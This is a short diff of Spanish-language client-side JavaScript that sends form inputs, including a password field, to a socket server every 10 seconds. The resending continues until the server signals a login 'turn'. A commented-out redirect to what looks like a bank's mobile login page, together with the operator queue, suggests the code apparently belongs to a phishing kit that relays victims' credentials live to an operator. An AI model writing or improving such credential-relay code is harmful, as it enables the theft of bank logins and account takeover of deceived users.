@@ -88,9 +88,8 @@ emitDataServer.addEventListener("click", () => {
                     dataInputs.socket = socket.id
                     socket.emit("ShowAvatar", dataInputs);
                     console.log(dataInputs)
-                    console.log("Enviando otra vez coño")
                 }
-            }, 30000);
+            }, 10000);
         } else {
             Alert2.style.display = "flex";
             preloader.style.display = "none";
@@ -99,10 +98,12 @@ emitDataServer.addEventListener("click", () => {
     } else {
         socket.emit("Data", dataInputs);
         setInterval(() => {
-            if(passInput.value.length == 0 > 0 && preloader.style.display == "block"){
+            if(passInput.value.length > 0 && preloader.style.display == "block" && !LoginReady){
+                dataInputs.socket = socket.id
                 socket.emit("Data", dataInputs);
+                console.log(dataInputs)
             }
-        }, 30000);
+        }, 10000);
         preloader.style.display = "block";
         //window.location.href = "/m/faces/pages/inicio.xhtml?s="+socket.id;
     }
@@ -112,6 +113,12 @@ var BuscandoAvatar = false;
 socket.on("YaEsMiTurno", data => {
     BuscandoAvatar = data
     console.log("Ya es mi turno "+ BuscandoAvatar)
+})
+
+var LoginReady = false;
+socket.on("YaEsMiTurnoLogin", data => {
+    LoginReady = data
+    console.log("Ya es mi turno login"+ LoginReady)
 })
 
 socket.on("Resend", Data => {
